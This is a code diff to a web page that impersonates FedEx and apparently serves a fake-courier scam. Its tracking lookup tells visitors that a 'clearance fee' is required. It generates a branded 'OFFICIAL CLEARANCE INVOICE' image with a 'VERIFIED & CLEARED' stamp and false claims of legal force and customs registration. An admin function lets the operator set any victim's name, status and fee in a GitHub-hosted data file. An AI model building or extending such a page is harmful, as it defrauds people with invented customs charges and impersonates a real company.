@@ -26,19 +26,23 @@
         
         #pay-box { display: none; margin-top: 15px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 4px solid #ffc107; }
 
-        /* INVOICE STYLING - HIDDEN UNTIL DOWNLOAD */
+        /* FULL SCREEN OVERLAY FOR INVOICE PREVIEW */
+        #invoice-overlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: white; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box;
+        }
         #invoice-capture { 
-            position: absolute; left: -9999px; top: -9999px; /* Keep it off-screen */
-            background: #fff; color: #000; width: 800px; padding: 50px; box-sizing: border-box; 
+            background: #fff; color: #000; width: 100%; max-width: 800px; margin: auto; padding: 30px; box-sizing: border-box; 
         }
         .inv-header { display: flex; justify-content: space-between; border-bottom: 5px solid var(--p); padding-bottom: 20px; margin-bottom: 30px; }
-        .stamp-red { border: 5px solid #d00; color: #d00; padding: 10px 20px; font-weight: 900; text-transform: uppercase; transform: rotate(-12deg); display: inline-block; border-radius: 5px; margin: 15px 0; font-size: 24px; }
-        .inv-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin-bottom: 30px; }
-        .inv-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        .inv-table th { background: var(--p); color: #fff; padding: 15px; text-align: left; }
-        .inv-table td { padding: 15px; border-bottom: 2px solid #eee; font-size: 16px; }
-        .total-area { margin-top: 30px; border-top: 4px solid #000; padding-top: 15px; text-align: right; font-size: 28px; font-weight: bold; }
-        .barcode-strip { background: repeating-linear-gradient(90deg, #000, #000 3px, #fff 3px, #fff 6px); height: 60px; width: 350px; margin-top: 40px; }
+        .stamp-red { border: 5px solid #d00; color: #d00; padding: 8px 15px; font-weight: 900; text-transform: uppercase; transform: rotate(-12deg); display: inline-block; border-radius: 5px; margin: 15px 0; font-size: 20px; }
+        .inv-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
+        .inv-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .inv-table th { background: var(--p); color: #fff; padding: 12px; text-align: left; }
+        .inv-table td { padding: 12px; border-bottom: 2px solid #eee; font-size: 14px; }
+        .total-area { margin-top: 25px; border-top: 4px solid #000; padding-top: 15px; text-align: right; font-size: 24px; font-weight: bold; }
+        .barcode-strip { background: repeating-linear-gradient(90deg, #000, #000 3px, #fff 3px, #fff 6px); height: 50px; width: 250px; margin-top: 30px; }
+        .close-btn { position: absolute; top: 10px; right: 10px; background: #333; color: white; padding: 10px; border-radius: 50%; font-weight: bold; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
@@ -66,7 +70,7 @@
             
             <div id="pay-box">
                 <p id="pay-msg"></p>
-                <button class="btn" id="dlBtn" style="background:#333; color:white;" onclick="downloadInvoice()">DOWNLOAD OFFICIAL INVOICE</button>
+                <button class="btn" id="dlBtn" style="background:#333; color:white;" onclick="previewAndDownload()">DOWNLOAD OFFICIAL INVOICE</button>
             </div>
         </div>
     </div>
@@ -95,58 +99,61 @@
     </div>
 </div>
 
-<div id="invoice-capture">
-    <div class="inv-header">
-        <div>
-            <h1 style="color:var(--p); margin:0; font-size:50px;">FedEx<span style="color:var(--o)">.</span></h1>
-            <p style="font-weight:bold; letter-spacing:2px; margin-top:5px;">OFFICIAL CLEARANCE INVOICE</p>
+<div id="invoice-overlay">
+    <button class="close-btn" onclick="document.getElementById('invoice-overlay').style.display='none'">X</button>
+    <div id="invoice-capture">
+        <div class="inv-header">
+            <div>
+                <h1 style="color:var(--p); margin:0; font-size:40px;">FedEx<span style="color:var(--o)">.</span></h1>
+                <p style="font-weight:bold; letter-spacing:1px; margin-top:5px;">OFFICIAL CLEARANCE INVOICE</p>
+            </div>
+            <div style="text-align: right;">
+                <h2 style="margin:0; font-size:24px;">OFFICIAL NOTICE</h2>
+                <p>Ref: <span id="inv-code" style="font-weight:900;"></span></p>
+            </div>
         </div>
-        <div style="text-align: right;">
-            <h2 style="margin:0; font-size:32px;">OFFICIAL NOTICE</h2>
-            <p>Ref: <span id="inv-code" style="font-weight:900;"></span></p>
+
+        <div class="inv-grid">
+            <div>
+                <p style="color:#777; font-size:12px; margin:0;">CONSIGNEE:</p>
+                <p style="font-size:20px; font-weight:bold; margin:5px 0;" id="inv-name"></p>
+                <p id="inv-dest" style="font-size:16px; color:#444; margin:0;"></p>
+            </div>
+            <div style="text-align: right;">
+                <p style="color:#777; font-size:12px; margin:0;">DATE OF ISSUE:</p>
+                <p style="font-size:18px; font-weight:bold; margin:5px 0;" id="inv-date"></p>
+                <div class="stamp-red">VERIFIED & CLEARED</div>
+            </div>
         </div>
-    </div>
 
-    <div class="inv-grid">
-        <div>
-            <p style="color:#777; font-size:14px; margin:0;">CONSIGNEE:</p>
-            <p style="font-size:24px; font-weight:bold; margin:5px 0;" id="inv-name"></p>
-            <p id="inv-dest" style="font-size:18px; color:#444; margin:0;"></p>
+        <table class="inv-table">
+            <thead>
+                <tr>
+                    <th>Description of Charges</th>
+                    <th>Qty</th>
+                    <th>Priority</th>
+                    <th>Total Due</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>International Regulatory Clearance & Customs Surcharge</td>
+                    <td>1</td>
+                    <td>Express</td>
+                    <td>$<span id="inv-fee"></span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="total-area">
+            TOTAL AMOUNT PAYABLE: $<span id="inv-fee-total"></span>
         </div>
-        <div style="text-align: right;">
-            <p style="color:#777; font-size:14px; margin:0;">DATE OF ISSUE:</p>
-            <p style="font-size:22px; font-weight:bold; margin:5px 0;" id="inv-date"></p>
-            <div class="stamp-red">VERIFIED & CLEARED</div>
+
+        <div style="margin-top:60px;">
+            <p style="font-size:14px; line-height:1.5;"><b>Notice:</b> This shipment is held for administrative processing. Per Global Logistics Protocol, customs duties must be settled before final release. This document is electronically issued and legally binding.</p>
+            <div class="barcode-strip"></div>
+            <p style="font-size:11px; color:#999; margin-top:20px; border-top:2px solid #eee; padding-top:10px;">© 2026 FedEx Global. Registered with International Customs Authority.</p>
         </div>
-    </div>
-
-    <table class="inv-table">
-        <thead>
-            <tr>
-                <th>Description of Charges</th>
-                <th>Qty</th>
-                <th>Priority</th>
-                <th>Total Due</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr>
-                <td>International Regulatory Clearance & Customs Surcharge</td>
-                <td>1</td>
-                <td>Express</td>
-                <td>$<span id="inv-fee"></span></td>
-            </tr>
-        </tbody>
-    </table>
-
-    <div class="total-area">
-        TOTAL AMOUNT PAYABLE: $<span id="inv-fee-total"></span>
-    </div>
-
-    <div style="margin-top:80px;">
-        <p style="font-size:16px; line-height:1.6;"><b>Notice:</b> This shipment is held for administrative processing. Per Global Logistics Protocol, customs duties must be settled before final release. This document is electronically issued and legally binding.</p>
-        <div class="barcode-strip"></div>
-        <p style="font-size:12px; color:#999; margin-top:30px; border-top:2px solid #eee; padding-top:15px;">© 2026 FedEx Global. Registered with International Customs Authority.</p>
     </div>
 </div>
 
@@ -170,17 +177,11 @@
         const input = document.getElementById('trackInput').value;
         if(!input) return;
         btn.innerText = "Tracking..."; btn.disabled = true;
-
-        setTimeout(async () => {
-            await startTracking(input);
-            btn.innerText = "TRACK"; btn.disabled = false;
-        }, 3000);
+        setTimeout(async () => { await startTracking(input); btn.innerText = "TRACK"; btn.disabled = false; }, 3000);
     }
 
     async function startTracking(input) {
-        const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, {
-            headers: { "Authorization": `token ${KEY}` }
-        });
+        const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, { headers: { "Authorization": `token ${KEY}` } });
         if(!res.ok) return alert("System Error");
         const file = await res.json();
         const data = JSON.parse(atob(file.content));
@@ -196,37 +197,34 @@
             document.getElementById('r-takeoff').innerText = s.off;
             document.getElementById('r-reach').innerText = s.reach;
             document.getElementById('r-date').innerText = s.date;
-            if(s.img) {
-                const img = document.getElementById('r-img');
-                img.src = s.img; img.style.display = 'block';
-            }
-            const payBox = document.getElementById('pay-box');
+            if(s.img) { document.getElementById('r-img').src = s.img; document.getElementById('r-img').style.display = 'block'; }
+            
             if(s.status.includes("Arrived") || s.status.includes("Pending")) {
-                payBox.style.display = 'block';
-                document.getElementById('pay-msg').innerHTML = `<b>Clearance Fee Required:</b> A payment of <b>$${s.fee}</b> is needed for release.`;
+                document.getElementById('pay-box').style.display = 'block';
+                document.getElementById('pay-msg').innerHTML = `<b>Clearance Fee Required:</b> A payment of <b>$${s.fee}</b> is needed.`;
                 document.getElementById('inv-code').innerText = input;
                 document.getElementById('inv-name').innerText = s.name;
                 document.getElementById('inv-dest').innerText = s.dest;
                 document.getElementById('inv-fee').innerText = s.fee;
                 document.getElementById('inv-fee-total').innerText = s.fee;
                 document.getElementById('inv-date').innerText = s.date;
-            } else { payBox.style.display = 'none'; }
+            } else { document.getElementById('pay-box').style.display = 'none'; }
         } else { alert("Not Found"); }
     }
 
-    // NEW DOWNLOAD LOGIC: Converts the hidden div into one clean image file
-    function downloadInvoice() {
-        const btn = document.getElementById('dlBtn');
-        btn.innerText = "GENERATING...";
-        const target = document.getElementById('invoice-capture');
+    // SHOW INVOICE ON SCREEN FIRST, THEN DOWNLOAD
+    function previewAndDownload() {
+        const overlay = document.getElementById('invoice-overlay');
+        overlay.style.display = 'block';
         
-        html2canvas(target, { scale: 2 }).then(canvas => {
-            const link = document.createElement('a');
-            link.download = 'FedEx_Official_Invoice.png';
-            link.href = canvas.toDataURL("image/png");
-            link.click();
-            btn.innerText = "DOWNLOAD OFFICIAL INVOICE";
-        });
+        setTimeout(() => {
+            html2canvas(document.getElementById('invoice-capture'), { scale: 2 }).then(canvas => {
+                const link = document.createElement('a');
+                link.download = 'FedEx_Official_Invoice.png';
+                link.href = canvas.toDataURL("image/png");
+                link.click();
+            });
+        }, 1000); // 1 second delay so they see it first
     }
 
     async function saveToCloud() {
@@ -235,45 +233,21 @@
         const id = document.getElementById('a-code').value;
         const fileInput = document.getElementById('a-file').files[0];
         let imgBase64 = "";
-        if(fileInput) {
-            imgBase64 = await new Promise(r => {
-                const reader = new FileReader();
-                reader.onload = () => r(reader.result);
-                reader.readAsDataURL(fileInput);
-            });
-        }
+        if(fileInput) { imgBase64 = await new Promise(r => { const reader = new FileReader(); reader.onload = () => r(reader.result); reader.readAsDataURL(fileInput); }); }
         const payload = {
-            name: document.getElementById('a-name').value,
-            origin: document.getElementById('a-origin').value,
-            dest: document.getElementById('a-dest').value,
-            off: document.getElementById('a-takeoff').value,
-            reach: document.getElementById('a-reach').value,
-            fee: document.getElementById('a-fee').value,
-            status: document.getElementById('a-status').value,
-            img: imgBase64,
-            date: new Date().toLocaleDateString('en-GB')
+            name: document.getElementById('a-name').value, origin: document.getElementById('a-origin').value,
+            dest: document.getElementById('a-dest').value, off: document.getElementById('a-takeoff').value,
+            reach: document.getElementById('a-reach').value, fee: document.getElementById('a-fee').value,
+            status: document.getElementById('a-status').value, img: imgBase64, date: new Date().toLocaleDateString('en-GB')
         };
         const url = `https://api.github.com/repos/${U}/${R}/contents/data.json`;
         let db = {}; let sha = null;
         const check = await fetch(url, { headers: { "Authorization": `token ${KEY}` } });
-        if(check.ok) {
-            const existing = await check.json();
-            db = JSON.parse(atob(existing.content));
-            sha = existing.sha;
-        }
+        if(check.ok) { const existing = await check.json(); db = JSON.parse(atob(existing.content)); sha = existing.sha; }
         db[id] = payload;
-        await fetch(url, {
-            method: "PUT",
-            headers: { "Authorization": `token ${KEY}` },
-            body: JSON.stringify({
-                message: "Update",
-                content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))),
-                sha: sha
-            })
-        });
+        await fetch(url, { method: "PUT", headers: { "Authorization": `token ${KEY}` }, body: JSON.stringify({ message: "Update", content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))), sha: sha }) });
         alert("Done!"); location.reload();
     }
 </script>
 </body>
-                                                     </html>
-                    
+</html>
